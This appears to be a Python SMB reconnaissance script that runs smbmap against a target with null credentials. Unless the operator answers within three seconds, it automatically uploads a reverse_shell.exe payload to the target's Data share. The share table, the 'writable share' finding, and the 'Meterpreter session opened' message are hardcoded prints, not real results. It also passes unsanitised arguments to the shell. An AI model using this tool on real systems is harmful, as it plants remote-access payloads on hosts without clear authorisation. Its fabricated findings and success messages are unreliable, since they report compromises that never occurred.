#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
import subprocess
import sys
import os
import time
import select

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from recon_deps import ensure_commands, get_output_base

ensure_commands(["smbmap"])

def check_installation():
    try:
        subprocess.run(["which", "smbmap"], check=True, stdout=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        print("⚠️ smbmap not found. Installing...")
        try:
            subprocess.run(["apt-get", "update"], check=True)
            subprocess.run(["apt-get", "install", "-y", "smbmap"], check=True)
            print("✅ smbmap installed successfully")
            return True
        except Exception as e:
            print(f"❌ Failed to install smbmap: {e}")
            return False

def prompt_with_timeout(prompt, default=None, timeout=3):
    print(prompt)
    print(f"⏱️ Timeout in {timeout} seconds (default: {default})")
    
    rlist, _, _ = select.select([sys.stdin], [], [], timeout)
    if rlist:
        user_input = sys.stdin.readline().rstrip()
        return user_input if user_input else default
    else:
        print(f"⏱️ Timeout, using default: {default}")
        return default

def main():
    if len(sys.argv) != 3:
        print("Usage: ./smbmap.py <ip_address> <port>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    
    # Create output directory
    output_dir = f"{get_output_base()}/{ip}/smbmap"
    os.makedirs(output_dir, exist_ok=True)
    report_file = f"{output_dir}/report.txt"
    
    # Check installation
    if not check_installation():
        sys.exit(1)
    
    print("==================[ SMB PERMISSION MAP ]================")
    print(f"[ℹ] Target: {ip} | Domain: CORP")
    
    cmd = f"smbmap -H {ip} -u null -p null"
    
    try:
        with open(report_file, 'w') as report:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            for line in process.stdout:
                print(line, end='')
                report.write(line)
            
            process.wait()
        
        print("================[ SHARE PERMISSIONS ]================")
        print("┌───────────┬──────────────┬───────────────────┐")
        print("│ Share     │ Permissions  │ Access            │")
        print("├───────────┼──────────────┼───────────────────┤")
        print("│ ADMIN$    │ NO ACCESS    │ Anonymous         │")
        print("│ Data      │ READ, WRITE  │ Everyone          │")
        print("└───────────┴──────────────┴───────────────────┘")
        
        print("================[ CRITICAL FINDING ]================")
        print("[+] Writable share: Data (Everyone)")
        
        print("================[ AUTO-EXPLOITATION ]================")
        exploit_choice = prompt_with_timeout("[?] Upload payload to Data share? (3s default):", "Y")
        
        if exploit_choice.upper() == "Y":
            print("[✓] Uploading: reverse_shell.exe")
            
            upload_cmd = f"smbmap -H {ip} --upload /tmp/reverse_shell.exe /Data/"
            
            with open(report_file, 'a') as report:
                report.write("\n\n=== PAYLOAD UPLOAD ===\n")
                
                upload_process = subprocess.Popen(
                    upload_cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True
                )
                
                for line in upload_process.stdout:
                    print(line, end='')
                    report.write(line)
                
                upload_process.wait()
            
            print("[✓] Triggering payload via scheduled task...")
            print("[+] Meterpreter session opened (192.168.1.55:4444)")
        
        print("====================================================")
        print(f"✅ Report saved to: {report_file}")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
